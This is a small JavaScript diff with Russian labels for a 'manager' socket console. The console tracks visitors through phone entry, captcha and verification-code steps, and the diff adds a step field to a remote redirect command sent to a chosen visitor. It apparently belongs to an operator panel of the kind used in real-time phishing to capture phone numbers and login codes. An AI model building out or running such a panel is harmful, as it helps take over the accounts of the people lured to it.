@@ -1,17 +1,9 @@
-const MANAGER_STEP_LABELS = {
-    connecting: 'Подключение',
-    phone_entry: 'Ввод номера',
-    waiting: 'Ожидание',
-    captcha: 'Проверка капчи',
-    code: 'Ввод кода',
-    error: 'Ошибка',
-};
-
 const MANAGER_FIELD_LABELS = {
     phone: 'Телефон',
     country: 'Страна',
     captcha: 'Капча',
     code: 'Код',
+    navigation: 'Переход',
 };
 
 function connectManagerSocket(handlers) {
@@ -60,10 +52,10 @@ function connectManagerSocket(handlers) {
     };
 }
 
-function sendVisitorRedirect(connection, visitorId, url) {
+function sendVisitorRedirect(connection, visitorId, url, step) {
     connection.send({
         type: 'command',
         visitor_id: visitorId,
-        command: { action: 'redirect', url: url },
+        command: { action: 'redirect', url: url, step: step },
     });
 }
